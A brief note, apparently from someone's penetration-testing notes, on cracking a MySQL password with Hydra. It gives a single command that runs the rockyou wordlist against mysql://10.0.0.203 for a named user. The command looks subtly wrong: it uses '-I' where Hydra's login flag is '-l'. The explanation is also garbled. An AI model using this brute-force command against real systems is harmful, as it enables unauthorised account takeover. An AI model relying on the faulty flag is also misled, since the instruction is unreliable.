
# In order to crack a password user using hydra you will need to have the user and them use the next parameter 

> hydra -I username -P /usr/share/wordlists/rockyou.txt mysql://10.0.0.203

As you can see l use the name of the protocol that l want to attack at the end follow by the ip of the target machine.